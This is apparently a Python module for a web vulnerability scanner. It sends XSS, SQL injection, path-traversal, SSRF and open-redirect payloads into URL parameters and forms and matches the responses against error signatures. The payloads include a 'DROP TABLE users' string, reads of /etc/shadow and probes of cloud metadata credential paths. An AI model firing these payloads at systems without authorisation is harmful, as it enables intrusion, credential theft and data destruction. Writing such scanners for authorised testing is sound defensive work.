"""
VulnScanner — active vulnerability checks.
Modules: XSS, SQLi, LFI, SSRF, Open Redirect, Security Headers.
"""

import threading
from urllib.parse import urlparse, urlencode, parse_qs, urljoin
from queue import Queue
from bs4 import BeautifulSoup

from modules.utils import (
    make_session, safe_get, safe_post, finding, log, Colors
)


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '{{7*7}}',   # Template injection probe
    '${7*7}',
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "' AND SLEEP(3)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "syntax error",
    "pg_query",
    "sqlite3",
    "microsoft sql server",
    "jdbc",
    "sqlstate",
    "sql server",
    "pdo",
    "you have an error in your sql",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",       # win.ini
    "[boot loader]",
    "for 16-bit app support",
    "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",           # GCP
    "http://169.254.169.254/metadata/v1/",        # DigitalOcean
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.1/",
]

SSRF_SIGNATURES = [
    "ami-id",
    "instance-id",
    "computeMetadata",
    "iam/security-credentials",
    "metadata",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F%2F",
    "/\\evil.com",
    "http://evil.com",
    "javascript:alert(1)",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}


# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict):
        self.config    = config
        self.recon     = recon_data
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()

    # ── Helpers ───────────────────────────────────────────────────────────

    def _add(self, f: dict):
        with self._lock:
            self.findings.append(f)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query param value with a payload."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _urls_with_params(self) -> list[str]:
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _run_threaded(self, fn, items):
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                result = fn(item)
                if result:
                    with lock:
                        results.extend(result if isinstance(result, list) else [result])
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    # ── XSS ──────────────────────────────────────────────────────────────

    def scan_xss(self) -> list[dict]:
        findings = []

        # 1. Reflected XSS via URL params
        for url in self._urls_with_params():
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            for param in params:
                for payload in XSS_PAYLOADS:
                    test_url = self._inject_param(url, param, payload)
                    resp = safe_get(self.session, test_url, self.timeout)
                    if resp and payload in resp.text:
                        f = finding(
                            "Reflected XSS", test_url, "high",
                            f"Parameter '{param}' reflects unsanitised payload",
                            f"Payload: {payload}"
                        )
                        findings.append(f)
                        log(f"  [XSS] {test_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                        break  # one confirmed payload is enough per param

        # 2. XSS via forms
        for form in self.recon.get("forms", []):
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                for payload in XSS_PAYLOADS[:3]:
                    data = {f["name"]: f.get("value", "test") for f in form["fields"]}
                    data[field["name"]] = payload
                    if form["method"] == "post":
                        resp = safe_post(self.session, form["action"], data, self.timeout)
                    else:
                        resp = safe_get(self.session, form["action"] + "?" + urlencode(data), self.timeout)
                    if resp and payload in resp.text:
                        f = finding(
                            "Reflected XSS (Form)", form["action"], "high",
                            f"Form field '{field['name']}' reflects unsanitised payload",
                            f"Payload: {payload}"
                        )
                        findings.append(f)
                        break

        return findings

    # ── SQLi ─────────────────────────────────────────────────────────────

    def scan_sqli(self) -> list[dict]:
        findings = []

        for url in self._urls_with_params():
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            for param in params:
                for payload in SQLI_PAYLOADS:
                    test_url = self._inject_param(url, param, payload)
                    resp = safe_get(self.session, test_url, self.timeout)
                    if resp:
                        lower_body = resp.text.lower()
                        matched = [err for err in SQLI_ERRORS if err in lower_body]
                        if matched:
                            f = finding(
                                "SQL Injection", test_url, "critical",
                                f"Parameter '{param}' triggers SQL error: {matched[0]}",
                                f"Payload: {payload}"
                            )
                            findings.append(f)
                            log(f"  [SQLi] {test_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            break

        # Time-based blind (basic)
        import time
        for url in self._urls_with_params():
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            for param in params[:2]:  # limit time-based checks
                test_url = self._inject_param(url, param, "' AND SLEEP(4)--")
                start = time.time()
                resp = safe_get(self.session, test_url, self.timeout + 5)
                elapsed = time.time() - start
                if resp and elapsed >= 4:
                    f = finding(
                        "Blind SQL Injection (Time-based)", test_url, "critical",
                        f"Parameter '{param}' caused ~{elapsed:.1f}s delay",
                        "Payload: ' AND SLEEP(4)--"
                    )
                    findings.append(f)

        return findings

    # ── LFI ──────────────────────────────────────────────────────────────

    def scan_lfi(self) -> list[dict]:
        findings = []
        for url in self._urls_with_params():
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            for param in params:
                for payload in LFI_PAYLOADS:
                    test_url = self._inject_param(url, param, payload)
                    resp = safe_get(self.session, test_url, self.timeout)
                    if resp:
                        body = resp.text
                        for sig in LFI_SIGNATURES:
                            if sig in body:
                                f = finding(
                                    "Local File Inclusion", test_url, "critical",
                                    f"Parameter '{param}' includes local file (signature: {sig!r})",
                                    f"Payload: {payload}"
                                )
                                findings.append(f)
                                log(f"  [LFI] {test_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
        return findings

    # ── SSRF ─────────────────────────────────────────────────────────────

    def scan_ssrf(self) -> list[dict]:
        findings = []
        for url in self._urls_with_params():
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            for param in params:
                for payload in SSRF_PAYLOADS:
                    test_url = self._inject_param(url, param, payload)
                    resp = safe_get(self.session, test_url, self.timeout)
                    if resp:
                        body = resp.text
                        for sig in SSRF_SIGNATURES:
                            if sig in body:
                                f = finding(
                                    "Server-Side Request Forgery (SSRF)", test_url, "critical",
                                    f"Parameter '{param}' may be fetching internal resources (sig: {sig!r})",
                                    f"Payload: {payload}"
                                )
                                findings.append(f)
                                break
        return findings

    # ── Open Redirect ─────────────────────────────────────────────────────

    def scan_open_redirect(self) -> list[dict]:
        findings = []
        urls = self.recon.get("urls", [])
        for url in urls:
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
            if not redirect_params:
                # Try appending redirect params even if not originally present
                redirect_params = REDIRECT_PARAMS[:5]

            for param in redirect_params:
                for payload in OPEN_REDIRECT_PAYLOADS:
                    test_url = self._inject_param(url, param, payload)
                    resp = safe_get(self.session, test_url, self.timeout)
                    if resp:
                        final = resp.url
                        if "evil.com" in final or (
                            resp.history and any(
                                "evil.com" in r.headers.get("Location", "")
                                for r in resp.history
                            )
                        ):
                            f = finding(
                                "Open Redirect", test_url, "medium",
                                f"Parameter '{param}' redirects to external domain",
                                f"Final URL: {final}"
                            )
                            findings.append(f)
                            log(f"  [REDIRECT] {test_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                            break
        return findings

    # ── Security Headers ─────────────────────────────────────────────────

    def scan_headers(self) -> list[dict]:
        findings = []
        target = self.config["target"]
        resp = safe_get(self.session, target, self.timeout)
        if not resp:
            return findings

        for header, severity in SECURITY_HEADERS.items():
            if header not in resp.headers:
                f = finding(
                    "Missing Security Header", target, severity,
                    f"Response is missing the '{header}' header",
                    f"Headers present: {list(resp.headers.keys())}"
                )
                findings.append(f)

        # Check for overly verbose server banner
        server = resp.headers.get("Server", "")
        x_powered = resp.headers.get("X-Powered-By", "")
        if any(c.isdigit() for c in server):
            findings.append(finding(
                "Information Disclosure (Server)", target, "low",
                f"Server header reveals version: {server!r}",
                ""
            ))
        if x_powered:
            findings.append(finding(
                "Information Disclosure (X-Powered-By)", target, "low",
                f"X-Powered-By reveals tech stack: {x_powered!r}",
                ""
            ))

        return findings


# Needed by scan_xss form branch
from urllib.parse import urlencode, urlparse, parse_qs
